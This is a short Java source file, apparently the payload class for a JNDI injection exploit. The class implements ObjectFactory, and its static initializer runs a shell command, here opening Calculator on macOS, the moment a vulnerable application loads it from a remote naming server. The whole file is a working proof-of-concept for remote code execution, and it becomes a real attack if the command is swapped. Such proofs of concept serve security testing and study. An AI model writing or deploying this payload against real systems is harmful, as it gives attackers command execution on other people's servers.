import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class PayloadClass implements ObjectFactory {
    static {
        try {
            Runtime.getRuntime().exec("open /Applications/Calculator.app");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
